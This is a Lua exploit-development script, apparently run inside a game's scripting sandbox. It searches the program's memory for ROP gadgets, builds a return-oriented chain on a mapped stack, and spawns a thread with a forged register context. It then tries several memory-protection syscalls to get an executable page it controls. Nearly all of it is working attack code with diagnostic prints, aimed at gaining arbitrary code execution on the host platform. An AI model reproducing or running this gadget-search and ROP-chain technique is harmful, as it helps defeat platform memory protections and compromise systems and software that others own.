-- CRASH_CLASS: HIGH
-- PROBE 928b: executable-page oracle, built on the verified 910a harness
--
-- 928a crashed the game before its target spawn: it started the control child
-- at RIP=pop_rdi, and the child ran wild (binary garbage on stdout, then the
-- game died). 910a spawns with RIP=fn — the fcall stub — with the chain on the
-- stack, and ten of those survive, so that is the only entry point proven to
-- work. This probe keeps that harness exactly and changes one thing at a time.
--
--   [A] control: RIP=fn, chain does getpid then thr_exit(431)
--   [B] write 0xC3 at code_page, verify the byte
--   [C] candidate X-granting calls, each return printed
--   [D] RIP=code_page: the page's single 'ret' pops the same chain
--
-- [D] surviving with `out` updated means a page we own executed. The process
-- dying at [D] means the page is not executable, which is the expected answer
-- and still a result.

print("=== PROBE 928b: executable-page oracle (910a harness) ===")

local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))

local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0) * 4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off
        if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base+off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] gadgets rax=%s rdi=%s store=%s jmp=%s",
    tostring(pop_rax), tostring(pop_rdi), tostring(store), tostring(jmp_g)))
if not (pop_rax and pop_rdi and store and jmp_g) then
    print("[!] gadget search failed - stopping")
    return
end

local PAGE = 0x4000
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8,
             SS=0x100, RDI=0x048, RSI=0x050, RDX=0x058, RCX=0x060, R8=0x068, RAX=0x078}
local ctx = memory.alloc(0x500)
local tb  = memory.alloc(8)
local out = memory.alloc(8)
local ts  = memory.alloc(16)

local function mmap(px)
    local _, a = pcall(function()
        return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002),
            uint64(0xFFFFFFFF), uint64(0))
    end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local function sleep_ms(ms)
    wq(ts, uint64(0)); wq(ts + 8, uint64(ms * 1000000))
    pcall(function() mk(240)(uint64(ts), uint64(0)) end)
end

-- one block: code page at +0x0000, chain at the top of the last page
local block = mmap(PAGE * 4)
if block == 0 then print("[!] mmap failed - stopping"); return end
local code_page = block
local start = block + PAGE * 4 - 0x200
print(string.format("[0] block=%X code_page=%X stack=%X", block, code_page, start))

-- chain: getpid -> *out, then thr_exit(431). Never returns.
local function write_chain()
    local ch = {pop_rdi, out, pop_rax, 20, fn, store,
                pop_rdi, 0, pop_rax, 431, fn, jmp_g}
    for k = 1, #ch do wq(start + (k - 1) * 8, uint64(ch[k])) end
end

local function spawn(entry, label)
    zero(ctx, 0x500); wq(tb, uint64(0)); wq(out, uint64(0))
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));    wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(entry));  wq(ctx+Ctx.RSP, uint64(start))
    wq(ctx+Ctx.RDI, uint64(0));      wq(ctx+Ctx.RAX, uint64(20))
    print("  [BEFORE] spawn " .. label .. " entry=" .. string.format("%X", entry))
    local ok, rv = pcall(function()
        return mk(430)(uint64(ctx), uint64(tb), uint64(0))
    end)
    local n = ok and to_num(rv) or -999
    print("  [AFTER ] spawn " .. label .. " ok=" .. tostring(ok) .. " rv=" .. n)
    return n
end

--------------------------------------------------------------------
-- A: control, entry = fcall stub (the 910a shape)
--------------------------------------------------------------------
print("--- A: control spawn through the stub ---")
write_chain()
spawn(fn, "control")
sleep_ms(120)
print("  control out=" .. string.format("%d", rd(out) or -1) ..
      " alive=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("")

--------------------------------------------------------------------
-- B: the code page
--------------------------------------------------------------------
print("--- B: write 0xC3 at the code page ---")
wb(code_page, 0xC3)
wb(code_page + 1, 0x00)
wb(code_page + 2, 0x00)
wb(code_page + 3, 0x00)
print(string.format("  code_page first dword = 0x%X (expect 0xC3)", rd(code_page) or 0))
print("")

--------------------------------------------------------------------
-- C: candidate X-granting calls
--------------------------------------------------------------------
print("--- C: candidates ---")
local cands = {
    {"mprotect74", function() return mk(74)(uint64(code_page), uint64(PAGE), uint64(7)) end},
    {"vm548_a",    function() return mk(548)(uint64(2), uint64(code_page), uint64(PAGE), uint64(7)) end},
    {"vm548_b",    function() return mk(548)(uint64(code_page), uint64(PAGE), uint64(7), uint64(2)) end},
    {"mtype585_a", function() return mk(585)(uint64(code_page), uint64(PAGE), uint64(7), uint64(0)) end},
    {"mtype585_b", function() return mk(585)(uint64(0), uint64(code_page), uint64(PAGE), uint64(7)) end},
}
for i = 1, #cands do
    local name, f = cands[i][1], cands[i][2]
    local ok, rv = pcall(f)
    print(string.format("  [C] %-12s ok=%s rv=%s", name, tostring(ok),
        tostring(ok and to_num(rv) or -999)))
end
print("")

--------------------------------------------------------------------
-- D: the oracle
--------------------------------------------------------------------
print("--- D: spawn with RIP inside the code page ---")
write_chain()
print("  the page holds one 'ret'; if it executes, the chain runs")
spawn(code_page, "code page")
sleep_ms(150)
print("  out=" .. string.format("%d", rd(out) or -1) ..
      " alive=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("[Z] SURVIVED - a page we own executed")
print("=== PROBE 928b COMPLETE ===")
